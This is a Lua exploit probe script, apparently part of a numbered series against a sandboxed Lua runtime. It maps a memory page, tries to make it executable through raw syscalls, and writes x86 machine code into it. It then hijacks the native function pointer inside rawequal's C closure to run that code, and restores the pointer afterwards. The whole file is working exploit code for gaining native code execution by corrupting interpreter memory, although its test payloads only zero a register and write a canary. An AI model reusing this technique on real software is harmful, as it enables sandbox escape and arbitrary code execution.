-- CRASH_CLASS: HIGH
-- PROBE 572a: does a data page execute when reached through the validated
-- CClosure redirect? 44a tested this through fn_addr, which 45c undermined.
--
-- [A] mmap page + mtypeprotect(7) + "xor eax,eax; ret" via rawequal's +0x20
-- [B] same page, a stub that stores a magic dword to a canary and returns 0
-- [C] restore and confirm rawequal still behaves

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

print("=== PROBE 572a: CCLOSURE EXEC PAGE ===")
local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end
print(string.format("[0] pid=%d alive=%s", pid, tostring(alive())))

local sc_mmap = mk(477)
local sc_mtypeprotect = mk(585)
local PS = 0x4000
local ok, page = pcall(function() return sc_mmap(uint64(0), uint64(PS), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
print(string.format("[1] mmap ok=%s page=%s", tostring(ok), fmt(page)))
if not ok or N(page) == 0 then print("FATAL: mmap failed"); return end
local P = N(page)

-- canary the stub will write
local canary = memory.alloc(0x10)
pcall(function() memory.write_dword(N(canary), 0x11111111) end)

-- [A] xor eax,eax; ret
wb(P + 0, 0x31); wb(P + 1, 0xC0); wb(P + 2, 0xC3)
-- [B] mov rax, <canary>; mov dword [rax], 0x12345678; xor eax,eax; ret
local ca = N(canary)
local code = {
    0x48, 0xB8, ca % 256, math.floor(ca / 256) % 256, math.floor(ca / 65536) % 256,
    math.floor(ca / 16777216) % 256, 0, 0, 0, 0,
    0xC7, 0x00, 0x78, 0x56, 0x34, 0x12,
    0x31, 0xC0, 0xC3,
}
for i, b in ipairs(code) do wb(P + 0x40 + i - 1, b) end

local ok1, rv1 = pcall(function() return sc_mtypeprotect(uint64(P), uint64(PS), uint64(7)) end)
print(string.format("[2] mtypeprotect(rwx,3) ok=%s rv=%s", tostring(ok1), tostring(rv1)))
local ok2, rv2 = pcall(function() return sc_mtypeprotect(uint64(P), uint64(PS), uint64(3), uint64(7)) end)
print(string.format("    mtypeprotect(3->7,4) ok=%s rv=%s", tostring(ok2), tostring(rv2)))
print(string.format("    page still readable: %02X %02X %02X", rd(P) % 256, math.floor(rd(P) / 256) % 256, math.floor(rd(P) / 65536) % 256))

-- locate rawequal's CClosure
local s = tostring(rawequal)
local astr = s:match(": ([0-9a-fA-F]+)$") or s:match("0x([0-9a-fA-F]+)")
local cc = astr and (tonumber(astr, 16) or tonumber(astr)) or nil
print(string.format("[3] rawequal closure=%s fn=%s", tostring(cc), cc and fmt(rq(cc + 0x20)) or "nil"))
if not cc then print("FATAL: no closure"); return end
local saved = rq(cc + 0x20)

print("[A] redirect to page+0 (xor eax,eax; ret)")
pcall(function() memory.write_qword(cc + 0x20, uint64(P)) end)
local okA, a1 = pcall(rawequal, 1, 2)
pcall(function() memory.write_qword(cc + 0x20, saved) end)
print(string.format("    ok=%s a1=%s alive=%s", tostring(okA), tostring(a1), tostring(alive())))
if not alive() then return end

print("[B] redirect to page+0x40 (store 0x12345678 to the canary, return 0)")
pcall(function() memory.write_qword(cc + 0x20, uint64(P + 0x40)) end)
local okB, b1 = pcall(rawequal, 1, 2)
pcall(function() memory.write_qword(cc + 0x20, saved) end)
print(string.format("    ok=%s b1=%s canary=%08X alive=%s",
    tostring(okB), tostring(b1), rd(N(canary)) or 0, tostring(alive())))

print(string.format("[C] restore check: rawequal(1,1)=%s rawequal(1,2)=%s alive=%s",
    tostring(rawequal(1, 1)), tostring(rawequal(1, 2)), tostring(alive())))
